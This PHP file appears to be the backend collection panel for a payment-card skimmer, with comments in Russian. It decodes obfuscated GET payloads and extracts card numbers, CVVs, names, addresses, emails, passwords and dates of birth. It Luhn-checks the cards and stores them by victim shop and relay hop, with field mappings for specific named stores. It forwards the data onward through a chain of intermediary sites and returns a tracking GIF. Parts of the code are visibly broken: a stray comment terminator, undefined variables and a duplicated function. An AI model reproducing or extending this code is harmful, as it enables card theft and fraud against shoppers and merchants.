<?php
$connect = 'mysql:host=localhost;dbname=snifftest';
$host = 'localhost';
$user = 'root';
$pass = '';
$db = 'snifftest';

try {
	$pdo = new PDO($connect, $user, $pass);
	echo "Connection established";
} catch (PDOException $e) {
	echo "Connection failed: " . $e->getMessage();
}

function validateLuhn(string $number): bool
{
    $sum = 0;
    $flag = 0;

    for ($i = strlen($number) - 1; $i >= 0; $i--) {
        $add = $flag++ & 1 ? $number[$i] * 2 : $number[$i];
        $sum += $add > 9 ? $add - 9 : $add;
    }

    return $sum % 10 === 0;
}

if (isset($_GET['key'])) {
    $ua = base64_encode($_SERVER['HTTP_USER_AGENT']);
    $url = $url . "?key=" . $_GET['key'] . "&ip=" . base64_decode($ip) . "&ua=" . base64_decode($ua) . "&hostname=" . base64_decode($hostname);
    header("Content-type: image/gif");
    $im = imagecreate(1, 1);
    imagesetpixel($im, 0, 0, 0xFFFFF);
    imagegif($im);
    imagedestroy($im);*/
	$ip = base64_encode($_SERVER['REMOTE_ADDR']);
    $ua = base64_encode($_SERVER['HTTP_USER_AGENT']);
    $hostnames = isset($_GET['hostnames']) ? json_decode(base64_decode($_GET['hostnames'])) : [];
    //$hostnames[] = base64_encode($_SERVER['HTTP_HOST']);
	$parsed_url = parse_url($_SERVER['HTTP_REFERER']);
	$hostnames[] = base64_encode($parsed_url['scheme'] . '://' . $parsed_url['host'] . $parsed_url['path']);
	
	array_pop($hostnames); // удаляет последний элемент в массиве (т.е. url самой панели)
    $url = $url . "?key=" . $_GET['key'] . "&ip=" . base64_decode($ip) . "&ua=" . base64_decode($ua) . "&hostname=" . base64_decode($hostname) . "&hostnames=" . base64_encode(json_encode($hostnames));
    file_get_contents($url);
    header("Content-type: image/gif");
    $im = imagecreate(1, 1);
    imagesetpixel($im, 0, 0, 0xFFFFF);
    imagegif($im);
    imagedestroy($im);

	function Decrypt ($hash){
		$x = $hash;
		$s = strrpos($x,'s=' . substr($x,11,5));
		$e = strrpos($x,substr($x,29,5) . '=t');
		if ($s == false || $e == false)  return $x; 
		$y = substr($x,$s + 7,$e - ($s + 7));
		$y = (int) $y;
		$d = substr($x,$y * 0.4, $y * 2);
		$v = "";
		for ($i = 0; $i < (strlen($d) / 2); $i++) {
			$c = substr($d,$i * 2 + 1,1);
			$v .= $c;
		}
	   return $v;
	}

$jsondata = base64_decode(Decrypt($_GET['key']));
}

if (isset($_GET['hash'])) {    
	$ip = base64_encode($_SERVER['REMOTE_ADDR']);
    $ua = base64_encode($_SERVER['HTTP_USER_AGENT']);
    $hostnames = isset($_GET['hostnames']) ? json_decode(base64_decode($_GET['hostnames'])) : [];
	
	$parsed_url = parse_url($_SERVER['HTTP_REFERER']);
	$hostnames[] = base64_encode($parsed_url['scheme'] . '://' . $parsed_url['host'] . $parsed_url['path']);
	
	array_pop($hostnames); // удаляет последний элемент в массиве (т.е. url самой панели)
	
	$url = $url . "?hash=" . $_GET['hash'] . "&ip=" . base64_decode($ip) . "&ua=" . base64_decode($ua) . "&hostname=" . base64_decode($hostname) . "&hostnames=" . base64_encode(json_encode($hostnames));
    file_get_contents($url);
    header("Content-type: image/gif");
    $im = imagecreate(1, 1);
    imagesetpixel($im, 0, 0, 0xFFFFF);
    imagegif($im);
    imagedestroy($im);

	function Decrypt ($hash){
			$x = $hash;
			$s = strrpos($x,'s=' . substr($x,11,5));
			$e = strrpos($x,substr($x,29,5) . '=t');
			if ($s == false || $e == false)  return $x; 
			$y = substr($x,$s + 7,$e - ($s + 7));
			$y = (int) $y;
			$d = substr($x,$y * 0.4, $y * 2);
			$v = "";
			for ($i = 0; $i < (strlen($d) / 2); $i++) {
				$c = substr($d,$i * 2 + 1,1);
				$v .= $c;
			}
		   return $v;
		}

$jsondata = base64_decode(Decrypt($_GET['hash']));
}
$jsondata_decode = json_decode($jsondata);
$jsondata_decode2 = json_decode($jsondata, true);

$key1 = "Number";
$key2 = "Date";
$key3 = "CVV";
$key4 = "Holder";
$key5 = "ZIP";
$key6 = "Address";
$key7 = "City";
$key8 = "State";
$key9 = "Country";
$key10 = "Phone";
$key11 = "Email";
$key12 = "Password";
$key13 = "Company";
$key14 = "UI";
$key15 = "Domain";
$key16 = "Dob";
$key17 = "Pad";
$key18 = "Counter";
$key19 = "Ipholder";
$key20 = "Redirect";

/*Begin: Parsing for missed values*/
$searchFirstName = 'first';
$searchFirstNameUp = 'First';
$searchLastName = 'last';
$searchLastNameUp = 'Last';
$searchAddress = 'address';
$searchAddressUp = 'Address';
$searchAddressFull = 'FullAdress';
$searchAddressUnderline = 'Address_';
$searchCity = 'city';
$searchCityUp = 'City';
$searchState_ = 'state';
$searchState = '_state';
$searchStateUp = 'State';
$searchCountry = 'country';
$searchCountryUp = 'Country';
$searchZip = 'zip';
$searchZipUp = 'Zip';
$searchPostal = 'postal';
$searchPostalUp = 'Postal';
$searchPostcode = 'postcode';
$searchPostcodeUp = 'Postcode';
$searchPhone = 'phone';
$searchPhoneUp = 'Phone';
$searchEmail = 'email';
$searchEmailUp = 'Email';
$searchPassword = 'password';
$searchPasswordUp = 'Password';
$searchDob = 'dob';
$searchDobUp = 'Dob';
$searchDobUP = 'DOB';
$searchCompany = 'company';
$searchCompanyUp = 'Company';

$resultFirstName = [];
$resultLastName = [];
$resultAddress = [];
$resultCity = [];
$resultState = [];
$resultCountry = [];
$resultZip = [];
$resultPhone = [];
$resultEmail = [];
$resultPassword = [];
$resultDob = [];
$resultCompany = [];

foreach($jsondata_decode as $key=>$value){
  if ((strpos($key, $searchFirstName) !== false) || (strpos($key, $searchFirstNameUp)!== false)) {
    array_push($resultFirstName, $value);
  }  
}
foreach($jsondata_decode as $key=>$value){
  if ((strpos($key, $searchLastName)!== false) ||  (strpos($key, $searchLastNameUp)!== false)) {
    array_push($resultLastName, $value);
  }  
}
foreach($jsondata_decode as $key=>$value){
  if ((strpos($key, $searchAddress)!== false) || (strpos($key, $searchAddressFull)!== false) || (strpos($key, $searchAddressUnderline)!== false)){
    array_push($resultAddress, $value);
  }  
}
foreach($jsondata_decode as $key=>$value){
  if ((strpos($key, $searchCity) !== false) || (strpos($key, $searchCityUp) !== false)) {
	  array_push($resultCity, $value);
  }
}
foreach($jsondata_decode as $key=>$value){
  if ((strpos($key, $searchState) !== false) || (strpos($key, $searchStateUp) !== false) || (strpos($key, $searchState_) !== false))  {
	  array_push($resultState, $value);
  }
}
foreach($jsondata_decode as $key=>$value){
  if ((strpos($key, $searchCountry) !== false) || (strpos($key, $searchCountryUp) !== false)) {
	  array_push($resultCountry, $value);
  }
}
foreach($jsondata_decode as $key=>$value){
  if ((strpos($key, $searchZip) !== false) || (strpos($key, $searchZipUp) !== false) || (strpos($key, $searchPostal) !== false) || (strpos($key, $searchPostalUp) !== false) || (strpos($key, $searchPostcode) !== false) || (strpos($key, $searchPostcodeUp) !== false)) {
	  array_push($resultZip, $value);
  }
}
foreach($jsondata_decode as $key=>$value){
  if ((strpos($key, $searchPhone) !== false) || (strpos($key, $searchPhoneUp) !== false)) {
	  array_push($resultPhone, $value);
  }
}
foreach($jsondata_decode as $key=>$value){
  if ((strpos($key, $searchEmail) !== false) || (strpos($key, $searchEmailUp) !== false)) {
	  array_push($resultEmail, $value);
  }
}
foreach($jsondata_decode as $key=>$value){
  if ((strpos($key, $searchPassword) !== false) || (strpos($key, $searchPasswordUp) !== false)) {
	  array_push($resultPassword, $value);
  }
}
foreach($jsondata_decode as $key=>$value){
  if ((strpos($key, $searchDob) !== false) || (strpos($key, $searchDobUp) !== false) || (strpos($key, $searchDobUP) !== false)) {
	  array_push($resultDob, $value);
  }
}
foreach($jsondata_decode as $key=>$value){
  if ((strpos($key, $searchCompany) !== false) || (strpos($key, $searchCompanyUp) !== false)) {
	  array_push($resultCompany, $value);
  }
}

if ($jsondata_decode->$key4 == null || $jsondata_decode->$key4 == "") $jsondata_decode->$key4 = $resultFirstName[0] . " " . $resultLastName[0];
if ($jsondata_decode->$key5 == null || $jsondata_decode->$key5 == "") $jsondata_decode->$key5 = $resultZip[0];
if ($jsondata_decode->$key6 == null || $jsondata_decode->$key6 == "") $jsondata_decode->$key6 = $resultAddress[0];
if ($jsondata_decode->$key7 == null || $jsondata_decode->$key7 == "") $jsondata_decode->$key7 = $resultCity[0];
if ($jsondata_decode->$key8 == null || $jsondata_decode->$key8 == "") $jsondata_decode->$key8 = $resultState[0];
if ($jsondata_decode->$key9 == null || $jsondata_decode->$key9 == "") $jsondata_decode->$key9 = $resultCountry[0];
if ($jsondata_decode->$key10 == null || $jsondata_decode->$key10 == "") $jsondata_decode->$key10 = $resultPhone[0];
if ($jsondata_decode->$key11 == null || $jsondata_decode->$key11 == "") $jsondata_decode->$key11 = $resultEmail[0];
if ($jsondata_decode->$key12 == null || $jsondata_decode->$key12 == "") $jsondata_decode->$key12 = $resultPassword[0];
if ($jsondata_decode->$key13 == null || $jsondata_decode->$key13 == "") $jsondata_decode->$key13 = $resultCompany[0];

if ($jsondata_decode->$key16 == null || $jsondata_decode->$key16 == "") $jsondata_decode->$key16 = $resultDob[0];

if ($jsondata_decode->$key15 == 'www.aussiedisposals.com.au') {
	$key5 = "postcode";
	$key6 = "street[0]";	
	$key7 = "city";
	$key8 = "region_id";
	$key9 = "country_id";
	$key10 = "telephone";
	$key11 = "username";
}

if ($jsondata_decode->$key15 == 'www.evybuy.com') {
	$key6 = "Adress";
}

if ($jsondata_decode->$key15 == 'www.first4figures.com') {
	$key5 = "billing[postcode]";
	$key6 = "billing[street][]";
	$key7 = "billing[city]";
	$key8 = "billing[region_id]";
	$key9 = "billing[country_id]";
	$key10 = "billing[telephone]";
	$key14 = "UserInfo";
}

$number = str_replace(' ', '', $jsondata_decode->$key1);
$date = str_replace(' ', '', $jsondata_decode->$key2);
$bin = mb_substr($number, 0, 6);
$tunix = $_SERVER['REQUEST_TIME'];
$t = date("Y-m-d H:i:s",$tunix);

$hostname = base64_decode($_GET['hostname']); //это последняя перед панелью прокладка

/***Здесь смотрю цепочку всех прокладок***/
$decoded_hostnames = array_map('base64_decode', $hostnames);
$padsChain = implode("->", $decoded_hostnames);
/******/


/**********************Счётчик входящих данных (последняя прокладка)**********************/
// Определение номера текущей прокладки
//$parts = explode("->", $padsChain);
//$lastValue = end($parts);
$currentURL = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$hopNumber = 4; // Заменить это значение на номер последней прокладки
$hopAddress = parse_url($currentURL, PHP_URL_PATH); // Адрес последней прокладки
	/*$fp = fopen("dataAddress.txt", "a") or die;
    file_put_contents("dataAddress.txt", $hopAddress . "\n",
    FILE_APPEND);
    fclose($fp);*/
// Получение текущего счетчика полученных данных на последней прокладке
$query = "SELECT сс_received FROM log_table WHERE hop_number = ? AND DATE(timestamp) = CURDATE()";
$stmt = $pdo->prepare($query);
$stmt->execute([$hopNumber]);
$result = $stmt->fetch(PDO::FETCH_ASSOC);

if ($result) {
    $receivedCounter = $result['сс_received'] + 1;

    // Обновление счетчика полученных данных на последней прокладке
    $query = "UPDATE log_table SET сс_received = ? WHERE hop_number = ? AND DATE(timestamp) = CURDATE()";
    $stmt = $pdo->prepare($query);
    $stmt->execute([$receivedCounter, $hopNumber]);

    echo "Updated received counter on hop " . $hopNumber . ": " . $receivedCounter . "<br>";
} else {
    // Проверка, нужно ли начать новый отсчёт счётчика на основе даты
    $currentDate = date("Y-m-d");

    //$query = "SELECT COUNT(*) as count FROM log_table WHERE DATE(timestamp) = ?";
	$query = "SELECT COUNT(*) as count FROM log_table WHERE hop_number = ? AND DATE(timestamp) = ?";
    $stmt = $pdo->prepare($query);
    //$stmt->execute([$currentDate]);
	$stmt->execute([$hopNumber, $currentDate]);
    $result = $stmt->fetch(PDO::FETCH_ASSOC);

    //echo "Existing records for current date: " . $result['count'] . "<br>"; // Отладочный вывод
	/*
	$fp = fopen("data1515155555.txt", "a") or die;
    file_put_contents("data1515155555.txt", $result['count'] . "\n",
    FILE_APPEND);
    fclose($fp);
	*/
    if ($result && $result['count'] == 0) {
        // Если записей для текущей даты не найдено, начинаем новый отсчёт счетчика
        $receivedCounter = 1;

        // Вставка новой записи счетчика полученных данных
		$query = "INSERT INTO log_table (hop_number, hop_address, сс_received) VALUES (?, ?, ?)";
		$stmt = $pdo->prepare($query);
		$stmt->execute([$hopNumber, $hopAddress, $receivedCounter]);


        echo "Started new counter for hop " . $hopNumber . ": " . $receivedCounter . "<br>";
    } else {
        // Если записи для текущей даты уже есть, ничего не делаем
        //echo "No new counter started for hop " . $hopNumber . "<br>";
    }
}
/**********************Конец счётчика входящих данных**********************/

if (validateLuhn ($number) == 1) {

$statementCcinfo = $pdo->prepare('INSERT IGNORE INTO ccinfonext VALUES(:comments, NULL, :ordernum, :number, :expire, :cvv, :holder, :zip, :address, :city, :state, :country, :phone, :email, :company, :dob, :password, :ipholder, :ui, :domain, :raw, :ccdate, :archivedate, :bin, :pad, :chain, :counter, :totalcount, :bincountry, :brand, :type, :bank, :level)
    ON DUPLICATE KEY UPDATE expire = :expire, cvv = :cvv, holder = :holder, zip = :zip, address = :address, city = :city, state =:state, phone = :phone, email = :email, company = :company, dob = :dob, password = :password, ipholder = :ipholder, ui = :ui, domain = :domain, raw = :raw, ccdate = :ccdate, archivedate = :archivedate, pad = :pad, chain = :chain, counter = :counter, totalcount = :totalcount, bincountry = :bincountry, type = :type, bank = :bank, level = :level');

$statementPads = $pdo->prepare('INSERT INTO pads VALUES(NULL, :pad, :shop, :counter, :totalcount, :last, :last_unix)');

$connect = mysqli_connect($host, $user, $pass, $db);
$query = "select count(*) from ccinfonext;";
if ($stmt = $connect->prepare($query)) {
    $stmt->execute();
    $stmt->bind_result($ordernum);
    while ($stmt->fetch()) {
	}
    $stmt->close();
}

$query = "select sum(counter) from ccinfonext where pad = '{$hostname}'";
if ($stmt = $connect->prepare($query)) {
    $stmt->execute();
    $stmt->bind_result($counter);
    while ($stmt->fetch()) {
    }
    $stmt->close();
}

//if ($jsondata_decode->$key20) {
$statementCcinfo->execute(array(
		"comments" => '',
		"ordernum" => $ordernum + 1,
		"number" => $number,
		"expire" => $date,
		"cvv" => $jsondata_decode->$key3,
		"holder" => $jsondata_decode->$key4,
		"zip" => $jsondata_decode->$key5,
		"address" => $jsondata_decode->$key6,
		"city" => $jsondata_decode->$key7,
		"state" => $jsondata_decode->$key8,
		"country" => $jsondata_decode->$key9,
		"phone" => $jsondata_decode->$key10,
		"email" => $jsondata_decode->$key11,
		"company" => $jsondata_decode->$key13,
		"dob" => $jsondata_decode->$key16,
		"password" => $jsondata_decode->$key12,
		"ipholder" => $jsondata_decode->$key19,
		"ui" => $jsondata_decode->$key14,
		"domain" => $jsondata_decode->$key15,
		"raw" => $jsondata,
		"ccdate" => $t,
		"archivedate" => '',
		"bin" => $bin,
		"pad" => $hostname,
		"chain" => $padsChain,
		"counter" => 1,
		"totalcount" => $counter + 1,
		"bincountry" => '',
		"brand" => '',
		"type" => '',
		"bank" => '',
		"level" => '',
));
//}

$statementPads->execute(array(
		"pad" => $hostname,
		"shop" => $jsondata_decode->$key15,
		"counter" => 1,
		"totalcount" => $counter + 1,
		"last" => $t,
		"last_unix" => $tunix,
));

$var1 = preg_replace('/[^a-zA-Z0-9.]/', '', $jsondata_decode->$key15);
$var2 = str_replace('.', '_', $var1);
$var3 = str_replace('www_', '', $var2);

$var4 = preg_replace('/[^a-zA-Z0-9.]/', '', $hostname);
$var5 = str_replace('.', '_', $var4);
$var6 = str_replace('www_', '', $var5);

	try {
		// Создание структуры таблицы shop_ на основе ccinfonext
		$pdo->exec("DROP TABLE IF EXISTS shop_".$var3);
		$pdo->exec("CREATE TABLE shop_".$var3." LIKE ccinfonext");

		// Копирование данных из ccinfonext в shop_
		$domain = $jsondata_decode->$key15;
		$quotedDomain = $pdo->quote($domain); // Экранирование домена
		$pdo->exec("INSERT INTO shop_".$var3." SELECT * FROM ccinfonext WHERE domain = " . $quotedDomain);

		//error_log("Таблица shop_".$var3." успешно создана и заполнена данными", 0);
		
		// Создание структуры таблицы pad_
		$pdo->exec("DROP TABLE IF EXISTS pad_" . $var6);
		$pdo->exec("CREATE TABLE pad_" . $var6 . " (
			`id` int(11) NOT NULL,
			`pad` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
			`shop` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
			`counter` int(255) NOT NULL,
			`totalcount` int(25) NOT NULL,
			`last` varchar(25) COLLATE utf8mb4_unicode_ci NOT NULL,
			`last_unix` int(55) NOT NULL
		) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci");

		$pdo->exec("ALTER TABLE pad_" . $var6 . " ADD PRIMARY KEY (`id`)");
		$pdo->exec("ALTER TABLE pad_" . $var6 . " MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=1");

		// Копирование данных из pads в pad_
		$hostnameQuoted = $pdo->quote($hostname); // Экранирование hostname
		$pdo->exec("INSERT INTO pad_" . $var6 . " 
					SELECT * FROM pads WHERE pad = " . $hostnameQuoted);

		//error_log("Таблицы shop_" . $var3 . " и pad_" . $var6 . " успешно созданы и заполнены", 0);
		
		//$fp = fopen("echo-shop.txt", "a") or die;
		//file_put_contents("echo-shop.txt", $var3, FILE_APPEND);

	} catch (PDOException $e) {
		error_log("Ошибка при создании таблицы shop_".$var3." - " . $e->getMessage(), 0);
		//$fp = fopen("echo-error.txt", "a") or die;
		//file_put_contents("echo-error.txt", $e->getMessage(), FILE_APPEND);
	}
}
